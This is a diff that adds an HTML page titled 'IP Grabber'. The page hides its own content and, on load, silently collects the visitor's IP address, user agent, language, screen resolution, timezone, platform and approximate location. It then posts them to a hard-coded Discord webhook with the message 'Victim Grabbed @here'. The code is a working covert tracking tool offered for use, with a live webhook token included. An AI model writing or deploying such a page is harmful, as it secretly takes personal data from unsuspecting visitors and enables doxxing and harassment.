@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>IP Grabber</title>
+    <style>
+        body {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div id="ip-container" style="display: none;">
+        <h1>IP Grabber</h1>
+        <p>Your IP address is: <span id="ip-address"></span></p>
+    </div>
+
+    <script>
+        function grabIP() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipAddress = data.ip;
+                    document.getElementById('ip-address').textContent = ipAddress;
+
+                    // Send IP address to Discord webhook
+                    const webhookUrl = 'https://discord.com/api/webhooks/1254497063295778867/rokaqO3IRHaUa9UE3U7Y5AzYbP6XCX_asP_rJSQzasb6bDDsigdgpBsjwNXKHKV2ms-L';
+                    const payload = {
+                        content: `Victim Grabbed @here`,
+                        embeds: [
+                            {
+                                fields: [
+                                    {
+                                        name: 'IP Address',
+                                        value: ipAddress,
+                                        inline: true
+                                    },
+                                    {
+                                        name: 'User Agent',
+                                        value: navigator.userAgent,
+                                        inline: true
+                                    },
+                                    {
+                                        name: 'Language',
+                                        value: navigator.language,
+                                        inline: true
+                                    },
+                                    {
+                                        name: 'Screen Resolution',
+                                        value: `${screen.width}x${screen.height}`,
+                                        inline: true
+                                    },
+                                    {
+                                        name: 'Timezone Offset',
+                                        value: `${new Date().getTimezoneOffset() / 60} hours`,
+                                        inline: true
+                                    },
+                                    {
+                                        name: 'Platform',
+                                        value: navigator.platform,
+                                        inline: true
+                                    },
+                                    {
+                                        name: 'Location',
+                                        value: 'Fetching location...',
+                                        inline: true
+                                    }
+                                ]
+                            }
+                        ]
+                    };
+
+                    // Fetch location information
+                    fetch(`https://ipapi.co/${ipAddress}/json/`)
+                        .then(response => response.json())
+                        .then(locationData => {
+                            payload.embeds[0].fields[6].value = `${locationData.city}, ${locationData.region}, ${locationData.country_name}`;
+                            fetch(webhookUrl, {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify(payload)
+                            });
+                        })
+                        .catch(error => {
+                            console.error('Error fetching location:', error);
+                            fetch(webhookUrl, {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify(payload)
+                            });
+                        });
+                })
+                .catch(error => {
+                    console.error('Error fetching IP address:', error);
+                });
+        }
+
+        grabIP();
+    </script>
+</body>
+</html>
